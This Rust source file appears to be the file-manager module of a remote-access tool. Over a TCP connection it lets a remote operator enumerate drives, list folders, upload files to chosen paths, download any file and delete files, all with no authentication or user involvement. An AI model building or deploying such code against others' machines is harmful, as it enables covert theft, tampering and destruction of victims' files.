use std::io::{Write, Read};
use std::net::TcpStream;
use std::fs;

use crate::utilities;

pub fn get_drives(stream: &TcpStream) {
  utilities::send_bytes(&stream, "drives".as_bytes());

  let mut drives = String::new();
  let drive_letters = [
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
  ];

  for drive_letter in drive_letters.iter() {
    let root_dir = format!("{}:\\", drive_letter);
    if fs::metadata(&root_dir).is_ok() {
      drives.push_str(&format!("{}|", drive_letter));
    }
  }

  utilities::wait_for_packet(&stream);
  utilities::send_bytes(&stream, drives.as_bytes());
}

pub fn get_files(stream: &TcpStream) {
  utilities::send_bytes(&stream, "files".as_bytes());
  let file_path = utilities::read_bytes_as_string(&stream, 1024);
  let mut files = String::new();
  
  let paths = match fs::read_dir(file_path) {
    Ok(paths) => paths,
    Err(_) => {
      utilities::send_bytes(&stream, "error".as_bytes());
      return;
    }
  };

  utilities::send_bytes(&stream, "ok".as_bytes());
  for path in paths {
    let entry = path.unwrap();
    let metadata = entry.metadata().unwrap();

    let filename = entry.file_name();
    let file_type_indicator = if metadata.is_file() { "file" } else { "folder" };
    let file_size = metadata.len();

    files.push_str(&format!("{}|{}|{}\n", filename.to_string_lossy(), file_type_indicator, file_size));
  }

  utilities::wait_for_packet(&stream);
  utilities::send_bytes(&stream, files.len().to_string().as_bytes());

  utilities::wait_for_packet(&stream);
  utilities::send_bytes(&stream, files.as_bytes());
}

pub fn upload(mut stream: &TcpStream) {
  stream.write_all("upload-file".as_bytes()).unwrap();

  let target_folder = utilities::read_bytes_as_string(&stream, 1024);

  stream.write_all("ok".as_bytes()).unwrap();

  let file_size = utilities::read_bytes_as_string(&stream, 1024).parse::<usize>().unwrap();
  stream.write_all("ok".as_bytes()).unwrap();

  let file_name = utilities::read_bytes_as_string(&stream, 1024);

  let mut file = match std::fs::File::create(format!("{}/{}", target_folder, file_name)) {
      Ok(file) => file,
      Err(_) => {
          stream.write_all("file-creation-failed".as_bytes()).unwrap();
          return;
      }
  };

  let mut buffer = vec![0; file_size];

  stream.read_exact(&mut buffer).unwrap();
  file.write_all(&buffer).unwrap();

  stream.write_all("file-uploaded".as_bytes()).unwrap();
}

pub fn download(stream: &TcpStream) {
  utilities::send_bytes(&stream, "download-file".as_bytes());
  let file_path = utilities::read_bytes_as_string(&stream, 1024);

  let file = match fs::read(file_path) {
    Ok(file) => file,
    Err(_) => {
      utilities::send_bytes(&stream, "file-not-exist".as_bytes());
      return;
    }
  };

  utilities::send_bytes(&stream, "ok".as_bytes());
  utilities::wait_for_packet(&stream);
  
  utilities::send_bytes(&stream, file.len().to_string().as_bytes());

  utilities::wait_for_packet(&stream);
  utilities::send_bytes(&stream, &file);
}

pub fn delete(stream: &TcpStream) {
  utilities::send_bytes(&stream, "delete-file".as_bytes());
  let file_path = utilities::read_bytes_as_string(&stream, 1024);

  match fs::remove_file(file_path) {
    Ok(_) => utilities::send_bytes(&stream, "file-deleted".as_bytes()),
    Err(_) => utilities::send_bytes(&stream, "file-not-exist".as_bytes())
  }
}